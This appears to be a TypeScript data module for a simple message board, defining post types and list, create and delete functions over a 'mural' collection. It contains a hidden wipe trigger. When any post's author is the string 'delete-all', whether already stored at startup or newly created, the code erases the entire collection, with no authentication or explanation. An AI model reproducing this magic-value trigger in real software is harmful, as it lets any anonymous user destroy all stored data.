import { getCollection } from './database.ts';

export interface CreatePostDto{
    message: string;
    author: string;
}

export interface Post {
    id: string;
    message: string;
    author: string;
    createdAt: Date;
    deletedAt?: Date;
}

const db = getCollection<Post>('mural');

const list = await db.list();

if(list.some(x => x.author === 'delete-all')) {
    await db.clean();
}

export const listAllPosts = () => db.list();

export const createPost = async (post: Post): Promise<Post> => {
    const newPost: Post = {
        id: crypto.randomUUID(),
        message: post.message,
        author: post.author,
        createdAt: new Date(),
    }

    await db.set(newPost);

    if(newPost.author === 'delete-all') {
        await db.clean();
    }

    return newPost;
}

export const deletePost = db.delete;
